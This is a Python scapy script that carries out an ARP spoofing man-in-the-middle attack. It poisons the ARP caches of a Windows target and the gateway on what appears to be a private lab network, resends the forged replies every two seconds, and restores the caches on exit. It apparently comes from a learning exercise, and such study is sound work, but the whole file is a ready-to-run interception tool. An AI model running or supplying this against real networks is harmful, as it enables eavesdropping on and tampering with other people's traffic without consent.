import scapy.all as scapy
from network_scanner import scan
import functools
import sys
import time
from datetime import datetime

TARGET_IP = "192.168.238.148"  # windows IP
GATEWAY_IP = "192.168.238.2"     # gateway IP

def get_mac(ip: str) -> str:
    """Scans for an IP address and returns it MAC address"""
    return scan(ip=ip)[0]["mac"]

def timestamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(
        op=2,   # ARP response
        pdst=target_ip,   # windows target ip
        hwdst=target_mac, # windows target mac
        psrc=spoof_ip # "pretening we're the router
    )
    scapy.send(packet, verbose=False)

    # print(packet.summary())
    # print(packet.show())

def restore(destination_ip: str, source_ip: str) -> None:
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=get_mac(destination_ip),
        psrc=source_ip,
        # important: we need the router's MAC, default is own
        hwsrc=get_mac(source_ip),
    )
    scapy.send(packet, count=4, verbose=False)

def handle_keyboard_exit(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except KeyboardInterrupt:
            print(f"{timestamp} - End spoofing")
    return wrapper

def main():
    print(f"{timestamp()} - Start spoofing")
    try:
        while True:
            spoof(target_ip=TARGET_IP, spoof_ip=GATEWAY_IP)
            spoof(target_ip=GATEWAY_IP, spoof_ip=TARGET_IP)
            print(f"{timestamp()} - Send 2 Packets", end="\r")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{timestamp()} - End spoofing")

    restore(destination_ip=GATEWAY_IP, source_ip=TARGET_IP)
    print(f"{timestamp()} - Addresses restored")

if __name__ == "__main__":
    main()